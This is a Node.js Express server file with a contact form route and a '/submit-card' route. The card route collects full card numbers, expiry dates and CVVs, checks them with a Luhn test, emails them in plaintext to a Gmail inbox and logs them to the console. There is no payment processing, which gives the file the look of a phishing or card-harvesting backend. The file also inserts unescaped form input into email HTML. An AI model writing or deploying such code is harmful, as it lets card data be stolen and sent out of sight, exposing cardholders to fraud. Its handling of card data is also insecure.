const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/submit', async (req, res) => {
  const { name, surname, email, phone, year } = req.body;

  const nameValid = name.length >= 2 && /^[A-Za-z]+$/.test(name);
  const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const phoneValid = /^\d{1,12}$/.test(phone);
  const currentYear = new Date().getFullYear();
  const yearValid = year <= currentYear && year >= currentYear - 120;

  if (!nameValid || !emailValid || !phoneValid || !yearValid) {
    return res.status(400).send("Invalid input data.");
  }

  try {
    await transporter.sendMail({
      from: `"Form Submission" <${process.env.EMAIL_USER}>`,
      to: process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER,
      subject: 'New Form Submission',
      html: `
        <h2>New Contact Form Submission</h2>
        <p><strong>Name:</strong> ${name} ${surname}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Phone:</strong> ${phone}</p>
        <p><strong>Year:</strong> ${year}</p>
        <p>Received at: ${new Date().toLocaleString()}</p>
      `
    });

    console.log('Form submission:', { name, surname, email, phone, year });
    res.send('Form submitted successfully!');
  } catch (error) {
    console.error('Email sending error:', error);
    res.status(500).send('Form submitted but failed to send email notification.');
  }
});

app.post('/submit-card', async (req, res) => {
  const { 'card-number': cardNumber, 'expiry-date': expiryDate, cvv } = req.body;

  if (!cardNumber || !expiryDate || !cvv) {
    return res.status(400).send("Missing card data.");
  }

  const cardNumberValid = isValidCardNumber(cardNumber);
  const expiryDateValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate);
  const cvvValid = /^\d{3}$/.test(cvv);

  if (!cardNumberValid || !expiryDateValid || !cvvValid) {
    return res.status(400).send("Invalid card information.");
  }

  try {
    await transporter.sendMail({
      from: `"Card Form Submission" <${process.env.EMAIL_USER}>`,
      to: process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER,
      subject: 'New Card Information Submitted',
      html: `
        <h2>Card Information Submitted</h2>
        <p><strong>Card Number:</strong> ${cardNumber}</p>
        <p><strong>Expiry Date:</strong> ${expiryDate}</p>
        <p><strong>CVV:</strong> ${cvv}</p>
        <p>Received at: ${new Date().toLocaleString()}</p>
      `
    });

    console.log('Card information submitted:', { 
      cardNumber, 
      expiryDate, 
      cvv 
    });
    res.send('Card information submitted successfully!');
  } catch (error) {
    console.error('Email sending error:', error);
    res.status(500).send('Card information submitted but failed to send email notification.');
  }
});

function isValidCardNumber(number) {
  let sum = 0;
  let shouldDouble = false;

  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number.charAt(i), 10);

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
}

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});